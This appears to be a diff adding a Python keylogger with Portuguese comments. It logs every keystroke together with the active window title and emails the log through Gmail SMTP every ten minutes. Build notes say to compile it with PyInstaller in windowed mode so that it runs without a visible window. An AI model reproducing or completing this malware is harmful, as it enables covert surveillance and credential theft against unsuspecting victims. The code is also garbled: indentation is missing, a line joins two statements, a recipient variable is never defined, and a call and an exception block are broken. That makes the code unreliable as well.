@@ -1,0 +1,79 @@
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from pynput import keyboard 
+from win32gui import GetWindowText, GetForegroundWindow 
+import datetime
+import threading 
+import os
+
+LAST_WINDOW = None
+LOG_FILE = "log.txt"
+
+## Logica de captura de teclas
+def tecla_pressionada(tecla):
+global LAST_WINDOW
+with open(LOG_FILE, "a") as file:
+window = GetWindowText(GetForegroundWindow())
+if window != LAST_WINDOW:
+LAST_WINDOW = window
+file.write("\n\n#### {} - {}\n".format(window, datetime.datetime.now()))
+
+try: 
+if hasattr(tecla, 'vk') and tecla.vk >= 96 and tecla.vk <= 105: 
+tecla = tecla.vk - 96
+except: 
+pass
+tecla = str(tecla).replace("'", "")
+if len(tecla) > 1:
+tecla = " [{}] ".format(tecla)
+file.write(tecla)
+
+#Envio do e-mail 
+def enviar_email():
+remetente = "coloqueseu@mail.com"
+senha = "**********" #sua senha
+if not os.path.exists(LOG_FILE):
+return
+with open(LOG_FILE, "r") as file:
+conteudo = file.read()
+msg = MIMEMultipart() 
+msg['From'] = remetente msg['To'] = destinatario
+msg['Subject'] = "Log de Teclas Capturadas"
+msg.attach(MIMEText(conteudo, 'plain'))
+
+try: 
+server = smtplib.SMTP
+('smtp.gmail.com', 587)
+server.starttls()
+server.login(remetente, senha)
+server.sendmail(remetente, destinatario, msg.as_string())
+server.quit()
+except Exception as e:
+
+# Envio programado
+def agendar_envio():
+enviar_email()
+threading.Timer(600, agendar_envio).start() 
+agendar_envio()
+
+# Inicio  do keylogger
+
+with keyboard.Listener(on_press=tecla_pressionada) as listener:
+    listener.join()
+
+#################################################################################################
+Como rodar no windows
+Instale as biblioteca  pip install pynput pywin32    
+Compile com PyInstalle
+
+pyinstaller --onefile --windowed keylogger.py
+execute com --onfile para nao aparecer a janala de execuçao
+###################################################################################################
+
+
+
+
+
+
+
